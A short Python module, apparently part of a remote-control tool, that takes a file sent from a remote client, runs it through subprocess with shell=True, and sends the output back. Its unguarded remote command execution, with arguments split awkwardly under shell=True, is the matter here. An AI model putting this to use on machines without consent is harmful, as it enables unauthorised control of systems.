from core.features.filetransfer import send_dir_to_remote
from core.utils import display_msg
import subprocess

def execute_app(client):
    file_2_run = send_dir_to_remote(client)

    display_msg("Executing commands", "g")
    # command_list = command.split(" ")
    print(file_2_run)

    # execute_list = command_list
    file_2_run = file_2_run.split(" ")
    output = subprocess.run(file_2_run, shell=True, capture_output=True, stdin=subprocess.DEVNULL)
    if output.stderr.decode('utf-8') == "":
        cmd_result = (output.stdout.decode('utf-8'))
    else:
        cmd_result = (output.stderr.decode('utf-8'))
    
    client.send_data(cmd_result)

